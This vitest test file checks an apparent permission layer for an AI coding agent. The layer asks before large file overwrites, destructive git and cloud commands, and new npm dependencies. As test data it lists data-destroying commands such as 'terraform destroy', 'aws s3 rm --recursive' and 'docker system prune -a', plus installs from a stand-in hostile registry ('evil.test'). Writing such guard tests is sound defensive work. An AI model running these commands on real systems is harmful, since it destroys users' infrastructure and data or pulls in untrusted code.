import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { askProtectionHit } from "./askProtections";
import { dependencyCommandHit } from "./dependencyChange";
import { destructiveCommandHit } from "./destructiveCommands";
import { testToolCall } from "./testToolCall";
import { parseLargeChangeLines } from "./userLimits";

const lines = (n: number) =>
  Array.from({ length: n }, (_, i) => `line ${i}`).join("\n");

let root: string;
beforeAll(() => {
  root = mkdtempSync(join(tmpdir(), "askmore-"));
  mkdirSync(join(root, "app", "src"), { recursive: true });
  writeFileSync(join(root, "app", "src", "big.ts"), lines(400));
  writeFileSync(join(root, "app", "src", "small.ts"), lines(5));
  writeFileSync(
    join(root, "app", "package.json"),
    JSON.stringify({
      dependencies: { lodash: "^4.0.0", "@scope/pkg": "1.0.0" },
      devDependencies: { vitest: "^1.0.0" },
    }),
  );
});
afterAll(() => rmSync(root, { recursive: true, force: true }));

function run(
  tool: string,
  args: Record<string, unknown>,
  cwd: string,
  largeChangeLines?: number,
) {
  return testToolCall({
    tool,
    args,
    levels: {
      context: "permissive",
      tools: "permissive",
      edits: "permissive",
      plan: "permissive",
      questions: "permissive",
    },
    sources: { user: { auto: { environment: { largeChangeLines } } } },
    cwd,
    shell: "bash",
  });
}

describe("ask-large-change, create_new_file over an existing file", () => {
  // The tester maps every file write to edit_existing_file, so ask the rule itself
  const create = (
    file: string,
    contents: string,
    extra: Record<string, unknown> = {},
    limit?: number,
  ) => {
    const resolvedPath = join(root, "app", "src", file);
    return {
      decision: askProtectionHit({
        toolName: "create_new_file",
        parsedArgs: { filepath: resolvedPath, contents, ...extra },
        resolvedPath,
        largeChangeLines: limit,
      })
        ? "ask"
        : "allow",
    };
  };

  it("asks when the file it replaces is large, however short the new text", () => {
    expect(create("big.ts", "x").decision).toBe("ask");
  });
  it("asks when the new text is large and the file exists", () => {
    expect(create("small.ts", lines(350)).decision).toBe("ask");
  });
  it("does not ask for a small file, a new file or an append", () => {
    expect(create("small.ts", "x").decision).toBe("allow");
    expect(create("fresh.ts", lines(900)).decision).toBe("allow");
    expect(create("big.ts", "x", { append: true }).decision).toBe("allow");
  });
  it("uses the person's own threshold, in both directions", () => {
    expect(create("big.ts", "x", {}, 500).decision).toBe("allow");
    expect(create("small.ts", lines(20), {}, 10).decision).toBe("ask");
    expect(
      run(
        "edit_existing_file",
        { filepath: "/home/dev/a.ts", changes: lines(301) },
        "/home/dev",
        1000,
      ).decision,
    ).toBe("allow");
  });
  it("ignores a threshold that is not a whole number of at least 1", () => {
    expect(parseLargeChangeLines(50)).toBe(50);
    for (const bad of [0, -3, 1.5, "50", null, undefined, NaN]) {
      expect(parseLargeChangeLines(bad)).toBeUndefined();
    }
  });
});

describe("ask-destructive-commands, history", () => {
  it.each([
    "git commit --amend",
    "git commit -a --amend --no-edit",
    "git branch -m renamed",
    "git branch --move renamed",
    "git branch -M main",
    "git branch -m old new -M",
    "git push --force-if-includes",
    "git update-ref -d refs/heads/x",
    "git gc --prune=now",
    "git reflog delete HEAD@{1}",
    "FOO=1 git commit --amend",
  ])("asks: %s", (c) => expect(destructiveCommandHit(c)).toBeDefined());

  it.each([
    "git commit -m fix",
    "git rebase --abort",
    "git reset --soft HEAD~1",
    "git reset --mixed HEAD~1",
    "git branch -m old new",
    "git branch --list",
    "git gc",
  ])("stays quiet: %s", (c) =>
    expect(destructiveCommandHit(c)).toBeUndefined(),
  );
});

describe("ask-destructive-commands, infrastructure", () => {
  it.each([
    "kubectl delete pod web",
    "kubectl -n prod delete deploy web",
    "kubectl --context=prod delete ns x",
    "kubectl drain node1",
    "kubectl cordon node1",
    "kubectl replace --force -f x.yaml",
    "oc delete project x",
    "helm uninstall web",
    "helm -n prod uninstall web",
    "terraform destroy",
    "terraform apply -auto-approve",
    "terraform apply --auto-approve=true",
    "terraform apply -destroy",
    "tofu destroy",
    "pulumi destroy --yes",
    "aws ec2 terminate-instances --instance-ids i-1",
    "aws --profile prod s3api delete-bucket --bucket b",
    "aws s3 rm s3://b --recursive",
    "aws s3 rb s3://b",
    "aws s3 sync . s3://b --delete",
    "az group delete -n rg",
    "az vm delete --name x",
    "gcloud compute instances delete vm1",
    "gcloud --project p sql instances delete db",
    "docker rm -f web",
    "docker container rm --force web",
    "docker rmi -f img",
    "docker system prune -a",
    "docker volume rm data",
    "docker compose down -v",
    "docker compose -f x.yml down --volumes",
    "docker-compose down -v",
    "podman volume rm data",
    "KUBECONFIG=x kubectl delete pod a",
    "env AWS_PROFILE=p aws ec2 delete-vpc --vpc-id v",
    "echo hi && terraform destroy",
    "bash -c 'kubectl delete pod a'",
  ])("asks: %s", (c) => expect(destructiveCommandHit(c)).toBeDefined());

  it.each([
    "kubectl get pods",
    "kubectl apply -f x.yaml",
    "kubectl describe node n",
    "kubectl logs delete-me",
    "helm install web ./chart",
    "helm list",
    "terraform plan",
    "terraform apply",
    "pulumi up",
    "aws ec2 describe-instances",
    "aws s3 ls",
    "aws s3 rm s3://b/key",
    "aws s3 cp a s3://b/a",
    "az vm list",
    "az group show -n rg",
    "gcloud compute instances list",
    "docker ps",
    "docker rm web",
    "docker volume ls",
    "docker compose up -d",
    "docker compose down",
    "docker build -f Dockerfile .",
  ])("stays quiet: %s", (c) =>
    expect(destructiveCommandHit(c)).toBeUndefined(),
  );

  it("is switched off by the rule's own switch", () => {
    const r = testToolCall({
      tool: "run_terminal_command",
      args: { command: "kubectl delete pod a" },
      levels: {
        context: "permissive",
        tools: "permissive",
        edits: "permissive",
        plan: "permissive",
        questions: "permissive",
      },
      sources: { builtin: { "ask-destructive-commands": false } },
      cwd: "/home/dev",
      shell: "bash",
    });
    expect(r.decision).toBe("allow");
  });
});

describe("ask-dependency-change, packages already declared", () => {
  const app = () => join(root, "app");
  const hit = (c: string, cwd: string | null = app()) =>
    dependencyCommandHit(c, "bash", cwd ?? undefined);

  it("exempts a bare name that package.json lists", () => {
    expect(hit("npm install lodash")).toBeUndefined();
    expect(hit("npm i lodash vitest")).toBeUndefined();
    expect(hit("npm install @scope/pkg --save-exact")).toBeUndefined();
    expect(hit("CI=1 npm install lodash")).toBeUndefined();
  });
  it("still asks for a package that is new, versioned, or from elsewhere", () => {
    expect(hit("npm install left-pad")).toBeDefined();
    expect(hit("npm install lodash left-pad")).toBeDefined();
    expect(hit("npm install lodash@3.0.0")).toBeDefined();
    expect(hit("npm install lodash@latest")).toBeDefined();
    expect(hit("npm install github:evil/lodash")).toBeDefined();
    expect(hit("npm install ./lodash")).toBeDefined();
    expect(hit("npm install lodash --registry=http://evil.test")).toBeDefined();
    expect(hit("npm install lodash --registry http://evil.test")).toBeDefined();
    expect(hit("npm install lodash --prefix /tmp/x")).toBeDefined();
    expect(hit("npm install -g lodash")).toBeDefined();
    expect(hit("npm install lodash -w other")).toBeDefined();
    expect(
      hit("npm_config_registry=http://e npm install lodash"),
    ).toBeDefined();
    expect(hit("cd other && npm install lodash")).toBeDefined();
    expect(hit("npm install lodash && npm install left-pad")).toBeDefined();
  });
  it("asks when the folder or package.json cannot be read", () => {
    expect(hit("npm install lodash", null)).toBeDefined();
    expect(hit("npm install lodash", join(root, "app", "src"))).toBeUndefined();
    expect(hit("npm install lodash", join(root, "nowhere"))).toBeDefined();
  });
  it("leaves the other managers as they were", () => {
    expect(hit("yarn add lodash")).toBeDefined();
    expect(hit("pnpm add lodash")).toBeDefined();
    expect(hit("npm uninstall lodash")).toBeDefined();
  });
  it("is reached through the evaluator with the call's folder", () => {
    const ok = run(
      "run_terminal_command",
      { command: "npm install lodash" },
      app(),
    );
    expect(ok.decision).toBe("allow");
    const n = run(
      "run_terminal_command",
      { command: "npm install evil" },
      app(),
    );
    expect(n.decision).toBe("ask");
  });
});
